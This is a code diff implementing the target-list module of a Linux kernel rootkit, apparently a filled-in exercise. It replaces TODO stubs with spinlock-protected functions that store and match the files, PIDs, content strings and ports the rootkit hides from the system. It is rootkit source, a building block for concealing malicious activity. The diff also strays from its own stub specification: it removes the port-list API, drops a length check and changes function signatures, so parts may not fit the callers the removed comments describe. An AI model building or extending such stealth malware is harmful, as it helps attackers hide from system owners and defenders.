@@ -1,79 +1,87 @@
 // SPDX-License-Identifier: GPL-2.0
-//
-// Target list management with spinlock protection.
-//
-// Four target categories: files, PIDs, content strings, and ports.
-// The hiding kretprobes in filter.c query these lists under lock.
-//
-#include <linux/errno.h>
+// core/target.c - Spinlocked target lists for hiding.
 #include <linux/string.h>
-
 #include "rootkit.h"
 
-// Global target list instances
 struct rk_target_list rk_file_targets;
 struct rk_target_list rk_pid_targets;
 struct rk_target_list rk_content_targets;
-struct rk_port_list rk_port_targets;
-
-// ---- string target operations ----
+struct rk_target_list rk_port_targets;
 
 void rk_target_init(struct rk_target_list *list)
 {
-	// TODO: Initialize spinlock and zero count
+	spin_lock_init(&list->lock);
+	list->count = 0;
 }
 
-int rk_target_add(struct rk_target_list *list, const char *value)
+int rk_target_add(struct rk_target_list *list, const char *name)
 {
-	// TODO: Under spin_lock_irqsave:
-	// - Check count < RK_MAX_TARGETS (return -ENOSPC)
-	// - Check strlen(value) < RK_TARGET_LEN (return -ENAMETOOLONG)
-	// - strscpy into list->targets[count], increment count
-	return -ENOSYS;
+	unsigned long flags;
+	int ret = 0;
+
+	spin_lock_irqsave(&list->lock, flags);
+	if (list->count >= RK_TARGET_MAX) {
+		ret = -ENOSPC;
+		goto out;
+	}
+	strscpy(list->targets[list->count], name, RK_NAME_MAX);
+	list->count++;
+out:
+	spin_unlock_irqrestore(&list->lock, flags);
+	return ret;
 }
 
-int rk_target_remove(struct rk_target_list *list, const char *value)
+int rk_target_remove(struct rk_target_list *list, int idx)
 {
-	// TODO: Under lock, find by strcmp, shift remaining, decrement count
-	// Return -ENOENT if not found
-	return -ENOENT;
+	unsigned long flags;
+	int ret = 0;
+
+	spin_lock_irqsave(&list->lock, flags);
+	if (idx < 0 || idx >= list->count) {
+		ret = -EINVAL;
+		goto out;
+	}
+	if (idx < list->count - 1) {
+		memmove(&list->targets[idx], &list->targets[idx + 1],
+			(list->count - idx - 1) * RK_NAME_MAX);
+	}
+	list->count--;
+out:
+	spin_unlock_irqrestore(&list->lock, flags);
+	return ret;
 }
 
 bool rk_target_match(struct rk_target_list *list, const char *name)
 {
-	// TODO: Under lock, exact strcmp match against all entries
-	return false;
+	unsigned long flags;
+	bool found = false;
+	int i;
+
+	spin_lock_irqsave(&list->lock, flags);
+	for (i = 0; i < list->count; i++) {
+		if (strcmp(list->targets[i], name) == 0) {
+			found = true;
+			break;
+		}
+	}
+	spin_unlock_irqrestore(&list->lock, flags);
+	return found;
 }
 
 bool rk_line_matches(struct rk_target_list *list,
-		     const char *line, size_t len)
+		     const char *line, int len)
 {
-	// TODO: Under lock, check if any target is a substring of line
-	// using strnstr(line, target, len)
-	return false;
-}
+	unsigned long flags;
+	bool found = false;
+	int i;
 
-// ---- port target operations ----
-
-void rk_port_init(struct rk_port_list *list)
-{
-	// TODO: Initialize spinlock and zero count
-}
-
-int rk_port_add(struct rk_port_list *list, unsigned short port)
-{
-	// TODO: Under lock, check bounds, append port, increment count
-	return -ENOSYS;
-}
-
-int rk_port_remove(struct rk_port_list *list, unsigned short port)
-{
-	// TODO: Under lock, find port, shift remaining, decrement count
-	return -ENOENT;
-}
-
-bool rk_port_match(struct rk_port_list *list, unsigned short port)
-{
-	// TODO: Under lock, linear scan for matching port
-	return false;
+	spin_lock_irqsave(&list->lock, flags);
+	for (i = 0; i < list->count; i++) {
+		if (strnstr(line, list->targets[i], len)) {
+			found = true;
+			break;
+		}
+	}
+	spin_unlock_irqrestore(&list->lock, flags);
+	return found;
 }
